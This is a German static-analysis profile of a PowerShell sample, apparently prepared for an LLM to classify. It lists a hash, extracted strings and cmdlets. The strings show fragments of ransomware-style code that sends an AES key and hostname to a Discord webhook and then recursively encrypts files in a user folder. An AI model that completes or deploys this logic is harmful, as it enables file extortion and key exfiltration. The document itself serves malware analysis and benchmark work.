# Steckbrief: tech_026_E-D.ps1

- SHA256: `eb6dd32c7b026b011bdaf6a08c2c58f7b6fb6eb652c063351936c617e4c26150`
- Groesse: 3945 Bytes, 122 Zeilen
- Ground-Truth-Label (aus Ordner): **techniques**
- Kein Urteil enthalten. Bewertung erfolgt durch das LLM.

## Stufe 1 - Reine Extraktion
- Strings gesamt: 25 (Auszug unten)
- Base64-Bloecke gesamt: 0, davon dekodierbar: 0
- Strings (Auszug):
  - `Encrypt`
  - `Decrypt`
  - `**Hostname:** $hostname `n**Key:** $message`
  - `application/json`
  - `Failed to send message to Discord: $_`
  - ` + [Convert]::ToBase64String($iv)
		Set-Content -Path `
  - ` -Value $passwordText

		$webhookSuccess = SendToDiscord $wh $passwordText $hostname

		if ($webhookSuccess) {
			C`
  - `

			Get-ChildItem -Path $p -Recurse -File | Where-Object { $_.Name -ne `
  - ` } | ForEach-Object {
				EncryptFile $_.FullName ($_.FullName + `
  - `) $aes
			}
		} else {
			Write-Host `
  - `
			# Optionally, remove the key file if the webhook is invalid.
			Remove-Item `
  - ` 
		}
	}



    if ($d) {
        $keyPath = `
  - `
        if (Test-Path $keyPath) {
            $passwordText = Get-Content $keyPath

            # Check if the key `
  - `).Count -ne 2) {
                Write-Host `
  - `
                return
            }

            $key = [Convert]::FromBase64String($passwordText.Split(`

## Stufe 2 - Statische Merkmale (zusaetzlich)
- Auffaellige Tokens (Name: Vorkommen):
  - frombase64: 2
- Pfade: `C:\Users\$env:USERNAME\Documents\test\`
- Cmdlets: Clear-Content, Get-ChildItem, Get-Content, Invoke-RestMethod, New-Object, Remove-Item, Set-Content, Test-Path, Where-Object, Write-Host

## Stufe 3 - Struktur (zusaetzlich)
- Beobachtete Abfolge:
  1. Base64-Inhalt dekodieren
